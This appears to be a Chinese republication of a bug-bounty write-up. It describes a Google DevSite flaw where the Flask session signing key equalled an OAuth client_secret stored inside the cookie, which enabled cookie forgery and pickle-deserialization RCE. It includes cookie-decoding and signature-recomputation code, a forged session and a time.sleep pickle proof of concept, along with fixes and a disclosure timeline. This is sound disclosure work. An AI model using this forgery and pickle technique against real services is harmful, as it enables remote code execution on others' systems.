#  Google 9 万美金的RCE：Flask 会话 Cookie 自签密钥与 Pickle 反序列化  
原创 Simon Koeck
                    Simon Koeck  黑白之道   2026-10-14 00:58  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6NzuDZGBzAae0xLAaI8uDmuG2aqI7FIed14mOhokicveF1iawrhIsUgO7hicbVc4eyX29Ocibs03teuRTpmiaia3Y55VIezVgxYl1I2Q/640?from=appmsg "")  
> **导语**  
：本文为编译报道，原文《How I Found a $90,000 Remote Code Execution Vulnerability in Google》由独立安全研究员 Simon Koeck 公开。核心 bug 一句话能讲完：developers.google.com 的 Flask 会话 Cookie 签名密钥，就是 Cookie 内部 pickle 化对象里塞的 OAuth client_secret。研究者把 Cookie 拆开拿到密钥，再用 pickle 反序列化打通整个 DevSite 平台，覆盖多个 Google 子域，谷歌奖了 9 万美金。  
  
## 一、起手：OAuth 流程里的 Cookie 长得不对劲  
  
Simon 当时在梳理 Google 开发者文档站点共享的 OAuth 流程。访问 https://developers.google.com/oauth2authorize?return_url=%2F  
，服务端会种一个 Flask 会话 Cookie 再跳到 Google 登录页，不需要账号就能触发。  
```
curl -s -D headers.txt -o /dev/null \  'https://developers.google.com/oauth2authorize?return_url=%2F'
```  
  
Cookie 正常情况下只塞个 CSRF token 和 return URL，但这个 Cookie **1,200 字节**  
，远大于应有尺寸。光这一条就不对劲，Simon 当场把它解了出来。  
## 二、Flask Cookie 内部：pickle 里藏着 OAuth 凭据  
  
Flask 的会话 Cookie 是签名而非加密，结构是 payload.timestamp.signature  
 三段。Payload 头部是 .  
 表示 zlib 压缩过。  
  
解码脚本：  
```
import base64import jsonimport pickletoolsimport zlibpayload, timestamp, signature = cookie.rsplit(".", 2)def b64decode(value):    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))compressed = payload.startswith(".")raw = b64decode(payload[1:] if compressed else payload)session = json.loads(zlib.decompress(raw) if compressed else raw)
```  
  
解出来是这样：  
```
{  "_permanent": true,  "google_oauth2_csrf_token": "...",  "google_oauth2_flow_<csrf>": {    " b": "..."  }}
```  
  
" b"  
 键是 Flask 标记 bytes 值的惯例。Base64 解码后是 pickle 字节流，pickletools.dis  
 出来一个 oauth2client.client.OAuth2WebServerFlow  
 对象：  
```
client_id     = "<redacted>.apps.googleusercontent.com"client_secret = b"<redacted>"
```  
  
**这个 Cookie 里直接装着 Google OAuth 的 client_id 和 client_secret**  
。client_secret  
 原文已脱敏，但漏洞披露时这个密钥仍然有效。光凭这一点已经是 secret leak，但更狠的在后面。  
## 三、密钥复用：client_secret 就是 Flask SECRET_KEY  
  
把 client_secret 当 Flask SECRET_KEY 试了一下，签出来的 HMAC 跟 Cookie 里的签名对得上。  
  
Flask 用 itsdangerous  
 库的 cookie-session  
 派生密钥。原文里 Simon 离线复算签名用的是这套：  
```
import hmacderived_key = hmac.digest(client_secret, b"cookie-session", "sha1")expected = hmac.digest(    derived_key,    f"{payload}.{timestamp}".encode(),    "sha1",)
```  
  
expected  
 跟 Cookie 原签名**逐字节相同**  
。  
  
Simon 又做了两组对照把"运气好蒙中"的可能排除掉：  
- 翻转签名的 1 字节 → 服务端拒绝  
  
- 用拿到的密钥重签原 payload → 服务端接受  
  
会话完整性已经形同虚设，攻击者可以随意改 session 里每个键值，再签一个服务端会认的 Cookie。**签名密钥 = 签名的对象内部字段**  
——这种自包含的设计一旦 secret 进 Cookie 就彻底崩盘。  
## 四、从伪造 Cookie 到 RCE  
  
OAuth 回调逻辑会从 session 里把 flow 对象读出来 pickle.loads 反序列化：  
```
session cookie  -> verify Flask signature  -> read google_oauth2_flow_<csrf>  -> base64-decode the bytes  -> pickle.loads(...)
```  
  
pickle.loads  
 的安全前提是"没人能伪造合法 Cookie"。密钥一公开，这前提就垮了。  
  
攻击者完全可以自己造一个 session：  
```
session = {    "_permanent": True,    "google_oauth2_csrf_token": "attacker-chosen",    "google_oauth2_flow_attacker-chosen": {        " b": base64.b64encode(attacker_blob).decode()    },}
```  
  
state  
 参数也是攻击者自己定的，**服务端拿不到任何外部信号**  
。签名过、flow 键命中、字节进 pickle.loads。Pickle 的 REDUCE  
 操作码会调一个 callable 并把元组当参数，不去认证来源，直接执行。这是 Python 生态里最经典的反序列化陷阱。  
## 五、PoC：用 time.sleep 证明 RCE  
  
不打生产，Simon 用 time.sleep  
 验证——这是安全研究里拿 RCE 的标准无害 PoC：  
```
import timeclass Sleep:    def __init__(self, seconds):        self.seconds = seconds    def __reduce__(self):        return (time.sleep, (self.seconds,))
```  
  
同一个伪造 session，只改 sleep 秒数：  
```
time.sleep(0) -> 0.207 stime.sleep(3) -> 3.193 stime.sleep(5) -> 5.194 stime.sleep(8) -> 8.283 s
```  
  
响应时间**正好跟数字走**  
——服务端确实 import 了 time  
，也确实执行了 sleep(N)  
。延迟差每次都精确到毫秒级，排除慢端点或网络抖动。  
  
五组对照把"巧合"和"边界条件"都排除掉：  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">用例</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">结果</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">不带 Cookie</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">Invalid request</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">签名翻 1 字节</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">Invalid request</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">签名合法但无 flow 键</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">Invalid request state</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">签名合法 + 真实 flow 键</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">走到 Google token exchange，因假 auth code 失败 </span><code><span leaf="">invalid_grant</span></code></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">签名合法 + sleep payload</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">延迟正好等于 sleep 秒数</span></section></td></tr></tbody></table>  
只有第 5 种组合出"延迟可控"，其他全部按预期失败。**攻击链完整**  
。  
  
![Google DevSite 攻击链：Cookie 自签密钥 → pickle 反序列化 → Google 子域 RCE](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6MttAZw6YSr8kaoJwianJe0GOB1evxY7feIqiaVRzTW5QTrRBpvod5rxtmv49g4axwdHib4wP9VqgtSjH3n7eic9Jn4Wa8ulAUvjow/640?from=appmsg "Google DevSite 攻击链：Cookie 自签密钥 → pickle 反序列化 → Google 子域 RCE")  
## 六、影响面：DevSite 平台跨域  
  
DevSite 平台是 Google 多个开发者站点共享的部署，developers.google.com  
 上拿到的密钥同时签发合法会话的还有：  
- firebase.google.com  
  
- developer.android.com  
  
- source.android.com  
  
- docs.partner.android.com  
  
按 Google VRP 官方裁定，本次报告影响范围覆盖 **7 个 Google 域名**  
（含 developers.google.com 本身及另外 6 个内部 DevSite 部署）。原文页头描述就明确写了"across seven Google domains"。  
## 七、修复方案  
  
四件事缺一不可：  
1. **轮换暴露的 OAuth client_secret**  
，并吊销用旧密钥签发的所有会话  
  
1. **每个部署独立高熵 Flask SECRET_KEY**  
，从服务端密钥管理系统取，跟 OAuth 凭据完全分离  
  
1. **OAuth flow 对象留在服务端**  
，Cookie 只持有一个不透明引用，不携带任何敏感字段  
  
1. **跨客户端边界禁用 pickle**  
，用纯数据格式 + schema 校验，伪造的 Cookie 进来直接无害化  
  
任何一条单独都能断掉攻击链。四条叠起来，才是两个 GET 请求拿到 Google 服务器代码执行的全部条件。Simon 在原文里点了一句：四个修复里任何一条单拎出来都够，关键是生产环境上四条全得做齐。  
## 八、披露时间线  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">时间</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-08-06 22:48</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">提交报告</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-08-07 08:12</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">分类</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-08-07 16:23</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">确认接收</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-08-27</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">赏金裁定：90,000 美元（Normal Google Applications T2，S0 RCE 基础 7.5 万 × 1.2 报告质量加成）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026-10-07 15:20</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">修复完成</span></section></td></tr></tbody></table>  
奖励结构：基础奖是 S0 RCE 类 75,000 美元，Simon 的报告被评为 exceptional quality（质量加分档），最终乘 1.2 = 9 万美金。  
## 九、出处  
- 原文标题：《How I Found a $90,000 Remote Code Execution Vulnerability in Google》  
  
- 作者：Simon Koeck（独立安全研究员）  
  
- 发布日期：2026-10-12  
  
- 原文 URL：https://simonkoeck.com/writeups/google-devsite-flask-session-pickle-rce  
  
- 协议：原文为博客公开内容，转载已注明作者与链接  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6M6dlD1dnh12fqNAI8nxYzF2ibqoLTe6M60ax7g9lniaHgR05Jya9wDq1ibxMwGfdNzU2T4Hc9xV5zOpWiaZhSOh4QibfVxPBPP0kas/640?from=appmsg "")  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621549&idx=1&sn=21c4b072726d2387d562109ada6b9bbb&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621944&idx=1&sn=3cc6dc9876a20466d4ec3634deb80220&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650622065&idx=1&sn=09f8ae84c06d4331e71c277b177ae701&scene=21#wechat_redirect)  
> 👇 点击**阅读原文**  
，访问我的网站  
  
  
